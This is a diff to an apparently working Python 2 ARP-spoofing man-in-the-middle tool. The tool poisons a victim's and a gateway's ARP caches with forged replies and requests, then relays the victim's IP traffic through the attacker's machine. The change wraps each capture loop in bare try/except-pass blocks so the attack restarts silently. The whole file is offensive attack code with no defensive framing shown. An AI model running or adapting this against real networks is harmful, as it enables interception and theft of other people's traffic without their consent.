@@ -27,19 +27,22 @@ def reply_to_request(infection_reply):
     pcap_handle = pcap.pcap(timeout_ms=0)
     pcap_handle.setfilter('arp')
     while True:
-        for capture in pcap_handle:
-            if capture is None:
-                continue
-            time_stamp, packet = capture
-            arp = ARP(packet)
-            if arp.operation == ARP.OP_REQUEST \
-                    and arp.sender_protocol_address == victim_ip \
-                    and arp.sender_hardware_address == victim_mac \
-                    and arp.target_protocol_address == gateway_ip:
-                print "[>+] Received victim's request for ip '{}'".format(gateway_ip)
+        try:
+            for capture in pcap_handle:
+                if capture is None:
+                    continue
+                time_stamp, packet = capture
+                arp = ARP(packet)
+                if arp.operation == ARP.OP_REQUEST \
+                        and arp.sender_protocol_address == victim_ip \
+                        and arp.sender_hardware_address == victim_mac \
+                        and arp.target_protocol_address == gateway_ip:
+                    print "[>+] Received victim's request for ip '{}'".format(gateway_ip)
 
-                pcap_handle.sendpacket(infection_reply.as_bytes())
-                print '[<+] Sent victim attack packet'
+                    pcap_handle.sendpacket(infection_reply.as_bytes())
+                    print '[<+] Sent victim attack packet'
+        except:
+            pass
 
         print 'relaying ip stopped unexpectedly. restarting.'
         pcap_handle = pcap.pcap(timeout_ms=0)
@@ -49,19 +52,22 @@ def follow_request_of_gateway(infection_request):
     pcap_handle = pcap.pcap(timeout_ms=0)
     pcap_handle.setfilter('arp')
     while True:
-        for capture in pcap_handle:
-            if capture is None:
-                continue
-            time_stamp, packet = capture
-            arp = ARP(packet)
-            if arp.operation == ARP.OP_REQUEST \
-                    and arp.ethernet.destination_mac == Ethernet.BROADCAST \
-                    and arp.sender_protocol_address == gateway_ip \
-                    and arp.sender_hardware_address == gateway_mac:
-                print "[>!] Detected gateway's arp request".format(gateway_ip)
+        try:
+            for capture in pcap_handle:
+                if capture is None:
+                    continue
+                time_stamp, packet = capture
+                arp = ARP(packet)
+                if arp.operation == ARP.OP_REQUEST \
+                        and arp.ethernet.destination_mac == Ethernet.BROADCAST \
+                        and arp.sender_protocol_address == gateway_ip \
+                        and arp.sender_hardware_address == gateway_mac:
+                    print "[>!] Detected gateway's arp request".format(gateway_ip)
 
-                pcap_handle.sendpacket(infection_request.as_bytes())
-                print '[<!] Sent victim infection request'
+                    pcap_handle.sendpacket(infection_request.as_bytes())
+                    print '[<!] Sent victim infection request'
+        except:
+            pass
 
         print 'relaying ip stopped unexpectedly. restarting.'
         pcap_handle = pcap.pcap(timeout_ms=0)
@@ -71,16 +77,19 @@ def relay_ip():
     pcap_handle = pcap.pcap(timeout_ms=0)
     pcap_handle.setfilter('ip src host {}'.format(victim_ip.in_string))
     while True:
-        for capture in pcap_handle:
-            if capture is None:
-                continue
-            time_stamp, packet = capture
-            print "[>!]got victim's ip packet to gateway."
-            relaying_packet = Ethernet(packet)
-            relaying_packet.source_mac = my_mac
-            relaying_packet.destination_mac = gateway_mac
-            pcap_handle.sendpacket(relaying_packet.as_bytes())
-            print '[<!]sent relay.'
+        try:
+            for capture in pcap_handle:
+                if capture is None:
+                    continue
+                time_stamp, packet = capture
+                print "[>!]got victim's ip packet to gateway."
+                relaying_packet = Ethernet(packet)
+                relaying_packet.source_mac = my_mac
+                relaying_packet.destination_mac = gateway_mac
+                pcap_handle.sendpacket(relaying_packet.as_bytes())
+                print '[<!]sent relay.'
+        except:
+            pass
 
         print 'relaying ip stopped unexpectedly. restarting.'
         pcap_handle = pcap.pcap(timeout_ms=0)
